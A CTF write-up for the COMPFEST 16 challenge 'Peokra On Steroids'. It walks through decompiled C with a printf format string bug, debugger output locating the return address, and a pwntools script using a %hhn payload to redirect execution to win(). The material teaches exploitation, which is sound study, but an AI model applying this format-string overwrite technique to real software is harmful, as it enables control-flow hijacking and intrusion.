# COMPFEST 16 Peokra On Steroids

### Source Code
The following is the source code of the `vuln` function. The goal of this challenge is to overwrite the `return` address with the address of the `win()` function. If we can achieve this, it will give us the flag.

```c
int vuln(void)
{
  int iVar1;
  ssize_t sVar2;
  long in_FS_OFFSET;
  int local_3c;
  int local_38;
  int i;
  char *local_30;
  char buffer [24];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_30 = buffer;
  local_3c = 0;
  puts("Halo, aku Peokra!! Aku bikin program yang bisa nerima input dari kalian.");
  printf(&DAT_001020b0);
  __isoc99_scanf(&DAT_001020f4,&local_3c);
  local_30 = local_30 + (long)local_3c * 4;
  puts("Sekarang input, tapi kalian gak boleh masukin huruf \'n\' ya:");
  sVar2 = read(0,buffer,16);
  local_3c = (int)sVar2;
  local_38 = 1;
  i = 0;
  do {
    if (local_3c + -1 <= i) {
LAB_0010144e:
      if (local_38 == 0) {
        puts(&DAT_00102138);
        iVar1 = 0;
      }
      else {
        printf("Kamu menginput: ");
        iVar1 = printf(buffer);
      }
      if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
        return iVar1;
      }
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    if (buffer[i] == 'n') {
      local_38 = 0;
      goto LAB_0010144e;
    }
    i = i + 1;
  } while( true );
}
```

Based on the program above, we can see that there is a format string vulnerability where `buffer` is printed using `printf` without sanitization. We can exploit this to overwrite the `return` address with the address of `win()`.

### Finding the Return Address Offset in `vuln()`

To find the offset of the return address in `vuln`, we can perform a series of tests by entering payloads like `%p,%p,%p,%p,%p` or `%n$p`.

```bash
Halo, aku Peokra!! Aku bikin program yang bisa nerima input dari kalian.
Pertama, masukkan umur kalian untuk disesuaikan sama input (😅): %p%p%p%p
Sekarang input, tapi kalian gak boleh masukin huruf 'n' ya:

Kamu menginput: p0x7fff28eeaea0(nil)(nil)
```

After some exploration, I found that the return address in `vuln` is located at offset 9. We can use `%9$p` to find the return address offset, and here’s the result of `%9$p`:

```bash=
pwndbg> %9$p

0x7fffffffdda8

pwndbg> x/20x $rsp
0x7fffffffdd60: 0x00000000      0x00000000      0x70e46469      0x00000005
0x7fffffffdd70: 0x00000001      0x00000004      0xffffdda8      0x00007fff
0x7fffffffdd80: 0x70243925      0x00007f0a      0xffffddb0      0x00007fff
0x7fffffffdd90: 0x00000000      0x00000000      0xcc2bc200      0x08eaefdb
0x7fffffffdda0: 0xffffddb0      0x00007fff      0x555552b5      0x00005555
```

From the `x/20x $rsp` output, it is clear that the address `0x7fffffffdda8` is the return address from `vuln` because it holds the value `0x00005555555552b5`, which is the address of `main`.

We can leverage this to change the address of `main` to the address of `win()`.

First, let’s find the address of `win()`:

```bash=
pwndbg> disassemble win
Dump of assembler code for function win:
   0x00005555555552bf <+0>:     endbr64
   0x00005555555552c3 <+4>:     push   rbp
   0x00005555555552c4 <+5>:     mov    rbp,rsp
   0x00005555555552c7 <+8>:     sub    rsp,0x120
   0x00005555555552ce <+15>:    mov    rax,QWORD PTR fs:0x28
   0x00005555555552d7 <+24>:    mov    QWORD PTR [rbp-0x8],rax
```

From the debug output above, we find that the address of `win()` is `0x00005555555552bf`. Our task now is to overwrite the `main` address in the return with `0x00005555555552bf`.

## Exploitation

We know that the return address offset in `vuln()` is 9, and our target address is `0x00005555555552bf`. Here is the payload that can be used to exploit the vulnerability and jump to the `win()` function:

```python
from pwn import *

# Allows easy swapping between local/remote/debug modes
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDB script below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './chall'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset

io = start()
io.clean(1)
io.send(b'10')
io.clean(1)

payload = b'AAAAA%191c%9$hhn'

io.send(payload)
io.interactive()
```

Thank you :)

